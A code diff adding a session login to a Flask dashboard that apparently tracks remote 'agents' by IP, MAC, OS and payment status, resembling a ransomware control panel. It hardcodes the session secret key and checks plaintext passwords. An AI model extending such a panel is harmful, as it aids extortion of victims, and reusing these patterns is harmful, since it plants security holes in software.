@@ -1,16 +1,47 @@
-from flask import Flask, render_template, request, jsonify, send_file
+from flask import Flask, render_template, request, jsonify, send_file, redirect, url_for, session, flash
 from io import BytesIO
 import socket, threading
 from database.database import init_db, get_db_connection
 
 app = Flask(__name__)
+app.secret_key = "supersecreto" 
+app.config['SESSION_PERMANENT'] = False  # Sesión no permanente
+app.config['SESSION_COOKIE_PERMANENT'] = False  # No mantener la cookie de sesión
 
 init_db()  # Inicializar la base de datos al iniciar la app
 agents = []
 connected_agents = {}  # Diccionario para almacenar las conexiones de agentes activas
 
+@app.route('/login', methods=['GET', 'POST'])
+def login():
+    if request.method == 'POST':
+        username = request.form.get('username')
+        password = request.form.get('password')
+
+        conn = get_db_connection()
+        c = conn.cursor()
+        c.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password))
+        user = c.fetchone()
+        conn.close()
+
+        if user:
+            session['user'] = username  # Guardar usuario en sesión
+            return redirect(url_for('index'))  # Redirigir al dashboard
+        else:
+            flash("Usuario o contraseña incorrectos", "error")
+
+    return render_template('login.html')
+
+@app.route('/logout')
+def logout():
+    session.pop('user', None)
+    return redirect(url_for('login'))
+
 @app.route('/') # Ruta principal 
 def index():
+    if 'user' not in session:  # Verificar si el usuario está logueado
+        return redirect(url_for('login'))
+    
     conn = get_db_connection()
     c = conn.cursor()
     c.execute('SELECT id, ip, mac, so, pay_status, timestamp FROM agents')
